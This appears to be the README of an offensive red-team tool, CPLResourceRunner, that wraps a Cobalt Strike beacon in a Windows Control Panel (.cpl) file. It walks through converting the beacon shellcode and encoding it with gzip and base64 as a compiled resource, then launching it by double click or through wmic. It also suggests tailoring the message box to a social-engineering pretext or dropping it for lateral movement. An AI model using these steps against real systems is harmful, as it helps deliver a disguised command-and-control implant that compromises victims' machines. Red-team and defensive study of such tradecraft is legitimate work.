# CPLResourceRunner
Create Payload "RAW" fully staged (S) in cobalt strike

Run ConvertShellcode.py on the beacon.bin file.
https://gist.githubusercontent.com/rvrsh3ll/abea05538480db9e41afa3799e5053bb/raw/74cdb762da1aa8556d04959d83900eaa2d6170d6/ConvertShellcode.py

Run String against the "shellcode.txt" file to get blob for cpl resource
cat shellcode.txt |sed 's/[, ]//g; s/0x//g;' |tr -d '\n' |xxd -p -r |gzip -c |base64 > b64shellcode.txt

Copy b64shellcode.txt contents into Resources.txt in this project

Compile to x86 anc copy CPLResourceRunner.dll to RunMe.cpl

Will launch with double click or 'wmic process call create "cmd.exe /c c:\wherever\RunMe.cpl"'

For asthetics, change the contents of the MsgBox to suit your pretext or remove for lateral movement usage.
